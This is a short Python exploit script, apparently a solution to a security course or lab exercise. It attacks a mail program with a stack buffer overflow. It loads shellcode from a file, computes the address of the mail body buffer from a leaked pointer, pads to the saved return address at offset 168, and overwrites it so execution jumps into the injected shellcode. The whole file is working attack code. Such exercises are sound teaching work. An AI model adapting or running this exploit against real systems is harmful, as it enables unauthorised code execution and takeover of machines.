#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(v):
    assert isinstance(v, str)
    sys.stdout.buffer.write(v.encode("ascii"))
    sys.stdout.flush()

def writeBytes(v):
    assert isinstance(v, bytes)
    sys.stdout.buffer.write(v)
    sys.stdout.flush()

def writeLong(v):
    assert isinstance(v, int)
    sys.stdout.buffer.write(v.to_bytes(8, 'little'))
    sys.stdout.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# read shellscript as bytestring, use writeBytes(payload) to write it out
with open("shell.bin", "rb") as f:
    payload = f.read()

# Here we have the address of the mutex struct.
psubject = int(sys.stdin.readline(), 16)

# (mail_subject=0x7fffffffd4f0, mail_body=0x7fffffffd470, diff=128)
p_mail_body = psubject - 128

# Distance from start of mail_body to saved rip = 168 bytes
# (saved rip=0x7fffffffd518, mail_body=0x7fffffffd470, diff=168)
offset_to_rip = 168

# shellcode (payload) is 82 bytes, pad 86 more bytes to reach saved rip
# then overwrite saved rip with address of mail_body (where shellcode lives)
body_exploit = payload + b"A" * (offset_to_rip - len(payload)) + p_mail_body.to_bytes(8, 'little')

eprint(f"psubject    = {hex(psubject)}")
eprint(f"p_mail_body = {hex(p_mail_body)}")
eprint(f"shellcode size = {len(payload)} bytes")
eprint(f"body payload size = {len(body_exploit)} bytes")

writeStr("hello\n")                   # subject: short, no overflow
writeBytes(body_exploit + b"\n")      # body: shellcode + padding + return address
